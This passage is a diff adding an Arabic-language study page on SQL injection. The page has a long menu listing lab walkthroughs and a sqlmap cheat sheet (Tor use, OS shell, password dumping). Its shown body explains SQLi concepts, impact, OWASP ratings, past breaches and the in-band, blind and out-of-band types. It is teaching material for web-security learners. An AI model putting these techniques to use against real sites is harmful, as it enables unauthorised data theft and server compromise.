+      
+        1. كود الفحص الأولي وكسر السياق
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-fingerprinting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. أكواد تحديد نوع قاعدة البيانات (Fingerprinting)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. كود كشف جدول المستخدمين
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. كود اختبار "السلاح" (الخطأ المشروط)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-administrator" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. كود كشف حساب الـ Administrator
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. كود استخراج طول كلمة المرور
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-intruder" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7. كود استخراج الحروف (مرحلة الـ Intruder)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#extracting-sensitive-data-via-verbose-sql-error-messagesextracting-sensitive-data-via-verbose-sql-error-messages" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Extracting sensitive data via verbose SQL error messagesExtracting sensitive data via verbose SQL error messages:
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-verbose-errors-query-structure" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. كشف بنية الاستعلام (Verbose Errors &amp; Query Structure)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-error-based-extraction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. استخراج البيانات باستخدام رسائل الخطأ (Error-Based Extraction)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-bypassing-character-limits" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. تخطي حدود الحروف (Bypassing Character Limits)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#visible-error-based-sql-injection-lab" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Visible error-based SQL injection LAB:
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-backend" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. تحليل ما حدث في الـ Backend
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. أين تكمن المشكلة في هذا الـ Payload؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. الحل والـ Payload الصحيح
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-id" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. تخلص من الـ ID الأصلي
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. احذف المسافات غير الضرورية
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        أقصر Payloads يمكنك تجربتها:
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        نصيحة سريعة أثناء التطبيق:
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        لماذا ظهر هذا الخطأ؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        كيف نصلح ذلك؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#payloads_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        الـ Payloads الصحيحة (جربها الآن):
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploiting-blind-sql-injection-by-triggering-time-delays" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploiting blind SQL injection by triggering time delays:
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-the-core-concept" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. الفكرة العبقرية خلف الوقت (The Core Concept)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-sql-server" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. تحليل أمثلة الـ SQL Server
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-data-extraction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. كيف نسرق البيانات حرفاً بحرف؟ (Data Extraction)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ملاحظة ذكية لك (تطبيقاً على ما تعلمناه):
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        طريقة بناء الاستعلام في PostgreSQL
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#query-postgresql" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        تعديل الـ Query الخاصة بك لتناسب PostgreSQL
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#remediation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        الوقاية والدفاع (Remediation)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dual-oracle" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        جدول DUAL في Oracle
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dual" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        خصائص جدول DUAL:
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dual_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        أمثلة لاستخدام جدول DUAL:
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. إجراء عملية حسابية بسيطة:
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dual_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        لماذا يتم استخدام جدول DUAL؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-order-by" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1️⃣ الطريقة الأسهل – ORDER BY
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sqlmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ما هي sqlmap أصلاً؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2️⃣ أمر المساعدة
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-sqlmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3️⃣ أهم أقسام الخيارات في sqlmap
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-target" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4️⃣ Target (تحديد الهدف)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4️⃣ Target (تحديد الهدف)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        الأمر الأساسي
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#google-dork" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Google Dork
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-request" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5️⃣ Request (كيفية إرسال الطلب)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5️⃣ Request (كيفية إرسال الطلب)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#post-data" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        إرسال POST Data
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cookie" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        إرسال Cookie
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#user-agent" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        تغيير User Agent
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#proxy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        استخدام Proxy
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tor" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        استخدام Tor
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-injection-options" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6️⃣ Injection Options
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="6️⃣ Injection Options">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#parameter" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        تحديد Parameter
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        تحديد نوع قاعدة البيانات
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-detection-options" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7️⃣ Detection Options
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="7️⃣ Detection Options">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#level" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Level
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#risk" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Risk
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8️⃣ Techniques
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#9-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        9️⃣ Enumeration (استخراج البيانات)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="9️⃣ Enumeration (استخراج البيانات)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        استخراج قواعد البيانات
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔟 استخراج الجداول
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#11" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        11️⃣ استخراج الأعمدة
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#12" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        12️⃣ استخراج البيانات
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#13" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        13️⃣ استخراج كل شيء
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#14" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        14️⃣ استخراج كلمات المرور
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#15" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        15️⃣ معرفة المستخدم الحالي
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#16-database" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        16️⃣ معرفة database الحالية
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#17" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        17️⃣ الوصول لنظام التشغيل
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="17️⃣ الوصول لنظام التشغيل">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        فتح shell
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        تنفيذ أمر
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_17" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        استغلال كامل
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#18-get-post" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        18️⃣ الفرق بين GET و POST
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="18️⃣ الفرق بين GET و POST">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#get-example" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        GET Example
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#post-example" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        POST Example
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#19-request-file" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        19️⃣ استخدام request file
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#20" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        20️⃣ استخراج الجداول
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#21" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        21️⃣ استخراج الأعمدة
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#22" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        22️⃣ استخراج البيانات
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#23-workflow" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        23️⃣ مثال Workflow كامل
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="23️⃣ مثال Workflow كامل">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1️⃣ اختبار الثغرة
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-dbs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2️⃣ استخراج DBs
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-tables" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3️⃣ استخراج tables
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-columns" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4️⃣ استخراج columns
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5-data" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5️⃣ استخراج data
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pentester" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ⚡ نصائح Pentester حقيقية
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#command" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔥 أهم Command يستخدمه المحترفين
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_18" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        نصيحة احترافية
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="نصيحة احترافية">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#sqlmap-master-cheat-sheet" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🛡️ SQLmap Master Cheat Sheet
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🛡️ SQLmap Master Cheat Sheet">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-targeting-basics" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. الأوامر الأساسية وتحديد الهدف (Targeting &amp; Basics)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-detection-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. الفحص والتحكم في التقنيات (Detection &amp; Techniques)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-enumeration-data-extraction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. استخراج البيانات (Enumeration &amp; Data Extraction)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-advanced-evasion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. الخيارات المتقدمة (Advanced &amp; Evasion)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h3 id="1-sql-injection"><strong>1. ما هي ثغرة حقن قواعد البيانات (SQL Injection)؟</strong></h3>
+<ul>
+<li>
+<p>تُعرف اختصاراً بـ SQLi، وهي ثغرة حقن في تطبيقات الويب تحدث عندما يقوم المهاجم بإدخال (حقن) استعلامات أو أوامر SQL خبيثة داخل حقول الإدخال الخاصة بالتطبيق.</p>
+</li>
+<li>
+<p>هي بطبيعتها "ثغرة حقن" (Injection Vulnerability)، مما يعني أنها تسمح بإرسال أوامر خبيثة للواجهة الخلفية (Back-end) ليتم تنفيذها بواسطة قاعدة البيانات، مما يتيح للمهاجم استرجاع بيانات واستخدامها لتحقيق أهدافه.</p>
+</li>
+</ul>
+<h3 id="2"><strong>2. ما هو السبب الجذري للثغرة؟</strong></h3>
+<ul>
+<li>
+<p><strong>المشكلة ليست في قاعدة البيانات نفسها:</strong> قاعدة البيانات وظيفتها تنفيذ أي استعلام SQL يتم إرساله إليها من تطبيق الويب، ولا يمكنها التمييز بين الاستعلام الشرعي والاستعلام الخبيث.</p>
+</li>
+<li>
+<p><strong>المشكلة الحقيقية:</strong> تكمن في تطبيق الويب نفسه؛ حيث يفشل المطورون في عمل تحقق أو فلترة صحيحة لمدخلات المستخدم (Input Validation)، مما يسمح بمرور الرموز والأوامر البرمجية إلى قاعدة البيانات دون تنظيف.</p>
+</li>
+</ul>
+<h3 id="3-prerequisites"><strong>3. شروط حدوث الثغرة (Prerequisites)</strong></h3>
+<p>لكي تنجح هجمة SQLi، يجب توفر شرطين أساسيين:</p>
+<ol>
+<li>
+<p><strong>نقطة إدخال (Input Point):</strong> يجب أن يحتوي التطبيق على مكان يسمح للمستخدم بإدخال بيانات (مثل نموذج تسجيل الدخول Username/Password).</p>
+</li>
+<li>
+<p><strong>التفاعل مع قاعدة البيانات:</strong> يجب أن تكون نقطة الإدخال هذه متصلة بقاعدة البيانات في الخلفية، سواء للتحقق من بيانات، أو قراءتها، أو إنشاء بيانات جديدة.</p>
+</li>
+</ol>
+<h3 id="4-cia"><strong>4. التأثير على أمن المعلومات (مثلث CIA)</strong></h3>
+<p>تعتبر الثغرة شديدة الخطورة لأنها تضرب الأعمدة الثلاثة الأساسية لأمن المعلومات (CIA Triad):</p>
+<ul>
+<li>
+<p><strong>السرية (Confidentiality):</strong> كسر السرية من خلال السماح للمهاجم بالوصول غير المصرح به لمعلومات حساسة (مثل كلمات المرور والبيانات الشخصية) لم يكن من المفترض أن يراها.</p>
+</li>
+<li>
+<p><strong>النزاهة (Integrity):</strong> يمكن للمهاجم تعديل أو حذف البيانات من القاعدة، مما يفقد النظام نزاهته ويجعل قاعدة البيانات غير موثوقة تماماً حتى بعد اكتشاف الاختراق.</p>
+</li>
+<li>
+<p><strong>التوافر (Availability):</strong> في حال قام المهاجم بحذف أو إتلاف بيانات أساسية يعتمد عليها التطبيق ليعمل، قد يؤدي ذلك إلى تعطل التطبيق بالكامل وخروجه عن الخدمة.</p>
+</li>
+</ul>
+<h3 id="5"><strong>5. عواقب إضافية متقدمة</strong></h3>
+<ul>
+<li>
+<p><strong>تنفيذ أوامر على الخادم (Code/Command Execution):</strong> إذا كان حساب قاعدة البيانات المُخترق يمتلك صلاحيات إدارية عالية (مثل Root)، يمكن للمهاجم الخروج من بيئة قاعدة البيانات وتنفيذ أوامر مباشرة على نظام التشغيل (Windows أو Linux)، مما يؤدي إلى اختراق الخادم بالكامل (RCE).</p>
+</li>
+<li>
+<p><strong>تخطي المصادقة (Authentication Bypass):</strong> يمكن استخدام الثغرة في حقول تسجيل الدخول لتخطي عملية التحقق والدخول كمدير أو كأي مستخدم دون الحاجة لمعرفة كلمة المرور الفعلية.</p>
+</li>
+</ul>
+<h3 id="6-owasp-top-10"><strong>6. تصنيف وتقييم الثغرة حسب (OWASP Top 10)</strong></h3>
+<p>في مجال أمن تطبيقات الويب، يُعتبر مشروع OWASP المرجع الأساسي. وقد أوضح المدرب كيف تُقيم OWASP هذه الثغرة:</p>
+<ul>
+<li>
+<p><strong>التصنيف:</strong> احتلت ثغرات الحقن (والتي تشمل SQLi) المركز الأول كأخطر ثغرة في عام 2017، والمركز الثالث في إصدار 2021.</p>
+</li>
+<li>
+<p><strong>مصفوفة المخاطر (Risk Matrix) الخاصة بها:</strong></p>
+<ul>
+<li>
+<p><strong>قابلية الاستغلال (Exploitability):</strong> سهلة جداً (تقييم 3/3)، حيث يمكن استغلال أي مصدر بيانات (عوامل متغيرة، Headers، حقول إدخال).</p>
+</li>
+<li>
+<p><strong>مدى الانتشار (Prevalence):</strong> شائعة ومنتشرة بقوة (تقييم 2/3)، خاصة في الأكواد القديمة وأنظمة إدارة المحتوى (CMS).</p>
+</li>
+<li>
+<p><strong>سهولة الاكتشاف (Detectability):</strong> سهلة الاكتشاف (تقييم 3/3) سواء يدوياً أو باستخدام أدوات الفحص الآلي (Scanners/Fuzzers) أو من خلال مراجعة الكود.</p>
+</li>
+<li>
+<p><strong>التأثير التقني (Technical Impact):</strong> كارثي/شديد (تقييم 3/3).</p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="7"><strong>7. نبذة تاريخية وأشهر الاختراقات</strong></h3>
+<p>الثغرة موجودة منذ بداية انتشار تطبيقات الويب المعتمدة على قواعد البيانات، وقد استعرض المدرب أمثلة تثبت أن هذا النوع من الهجمات يؤدي دائماً إلى تسريب كميات ضخمة من البيانات:</p>
+<ul>
+<li>
+<p><strong>عام 2000:</strong> أول توثيق علني للثغرة تم بواسطة الباحث Jeff Forristal (المعروف بـ Rain Forest Puppy) في مؤتمر DEFCON 8.</p>
+</li>
+<li>
+<p><strong>عام 2000:</strong> اختراق موقع CD Universe وسرقة بيانات بطاقات ائتمانية.</p>
+</li>
+<li>
+<p><strong>عام 2002:</strong> مجموعة هكرز روسية (The Hellikers) اخترقت قاعدة بيانات الأمم المتحدة.</p>
+</li>
+<li>
+<p><strong>عام 2012:</strong> اختراق شبكة LinkedIn الشهير وتسريب 6.5 مليون كلمة مرور.</p>
+</li>
+<li>
+<p><strong>عام 2015:</strong> اختراق موقع Ashley Madison وتسريب بيانات مستخدمين حساسة.</p>
+</li>
+</ul>
+<hr />
+<h3 id="sql-injection"><strong>التصنيف الأساسي لثغرات SQL Injection</strong></h3>
+<p>أوضح المدرب أن ثغرة SQLi ليست نوعاً واحداً، بل تنقسم إلى ثلاثة أنواع رئيسية تعتمد على طريقة عملها، وكيفية استغلالها، وكيفية استرجاع البيانات من قاعدة البيانات.</p>
+<h4 id="1-in-band-sqli"><strong>1. الحقن المباشر (In-band SQLi)</strong></h4>
+<p>هذا هو النوع الأكثر شيوعاً وسهولة. الفكرة الأساسية هنا هي استخدام "نفس قناة الاتصال" (Same Communication Channel) لإرسال الهجوم واستقبال النتيجة.</p>
+<ul>
+<li>
+<p><strong>كيف يعمل؟</strong> تقوم بإدخال استعلام SQL الخبيث عبر حقل في تطبيق الويب (مثل نموذج بحث). يقوم التطبيق بإرسال الاستعلام لقاعدة البيانات. قاعدة البيانات تنفذ الاستعلام وترد بالبيانات. وأخيراً، يقوم تطبيق الويب بعرض هذه البيانات مباشرة على نفس الصفحة التي قمت فيها بالحقن.</p>
+</li>
+<li>
+<p><strong>خطورته:</strong> خطير جداً لأنه يتيح استخراج البيانات فوراً وبشكل مرئي دون الحاجة لأدوات معقدة، فبمجرد إدخال الاستعلام، تظهر لك النتيجة مباشرة.</p>
+</li>
+</ul>
+<p><strong>الأنواع الفرعية لـ (In-band SQLi):</strong></p>
+<ol>
+<li>
+<p><strong>Error-based SQLi (الحقن المعتمد على الأخطاء):</strong> تعتمد هذه التقنية على إجبار قاعدة البيانات على إظهار رسالة خطأ. هذه الرسالة غالباً ما تحتوي على معلومات مفيدة مثل نوع قاعدة البيانات أو محتوياتها. يتم استخدامها عادةً كخطوة أولى لتأكيد وجود الثغرة.</p>
+</li>
+<li>
+<p><strong>Union-based SQLi (الحقن المعتمد على الاتحاد):</strong> في هذا النوع، تستخدم معامل <code>UNION</code> الخاص بلغة SQL. يقوم هذا المعامل بدمج نتائج استعلامك الخبيث مع نتائج الاستعلام الأصلي الذي ينفذه التطبيق، مما يسمح لك باستخراج بيانات غير مصرح لك برؤيتها (مثل دمج قائمة المقالات مع قائمة أسماء المستخدمين).</p>
+</li>
+</ol>
+<h4 id="2-blind-sqli"><strong>2. الحقن الأعمى (Blind SQLi)</strong></h4>
+<p>هنا تصبح الأمور أكثر تعقيداً. في هذا النوع، التطبيق مصاب بالثغرة وينفذ الاستعلامات، لكنه "لا يعرض أي بيانات أو رسائل خطأ" على الشاشة. أنت فعلياً "أعمى" (Blind) ولا ترى نتائج استعلامك مباشرة.</p>
+<ul>
+<li><strong>كيف يعمل؟</strong> بما أنك لا ترى النتائج، ستعتمد على تحليل استجابة التطبيق لمعرفة ما إذا كان الاستعلام صحيحاً أم لا.</li>
+</ul>
+<p><strong>الأنواع الفرعية لـ (Blind SQLi):</strong></p>
+<ol>
+<li>
+<p><strong>Boolean-based SQLi (الحقن المنطقي):</strong> تقوم بإرسال استعلامات SQL عبارة عن أسئلة إجابتها إما "صح" (True) أو "خطأ" (False). على سبيل المثال، "هل الحرف الأول من كلمة المرور هو 'A'؟". إذا استجاب التطبيق بشكل طبيعي، فالإجابة "صح"، وإذا ظهر خطأ أو لم يكتمل التحميل، فالإجابة "خطأ". من خلال سلسلة من الأسئلة، يمكنك تخمين البيانات حرفاً بحرف.</p>
+</li>
+<li>
+<p><strong>Time-based SQLi (الحقن المعتمد على الوقت):</strong> هنا تعتمد على وقت استجابة الخادم. ترسل استعلاماً يتضمن أمراً بتأخير الرد (مثلاً 10 ثوانٍ). إذا تأخرت الصفحة في التحميل لمدة 10 ثوانٍ، فهذا يؤكد أن الاستعلام قد نُفذ وأن الثغرة موجودة.</p>
+</li>
+</ol>
+<h4 id="3-out-of-band-sqli"><strong>3. الحقن خارج النطاق (Out-of-band SQLi)</strong></h4>
+<p>هذا النوع هو الأقل شيوعاً وصعب التنفيذ، ويعتمد على استخدام "قناة اتصال مختلفة" لاسترجاع البيانات.</p>
+<ul>
+<li><strong>كيف يعمل؟</strong> تقوم بإرسال الاستعلام عبر تطبيق الويب كالمعتاد. ولكن بدلاً من انتظار الرد على نفس التطبيق، تقوم بتضمين أمر في الاستعلام يجبر قاعدة البيانات على إرسال النتيجة إلى خادم خارجي تسيطر عليه أنت (عن طريق طلبات HTTP أو DNS).</li>
+</ul>
+<hr />
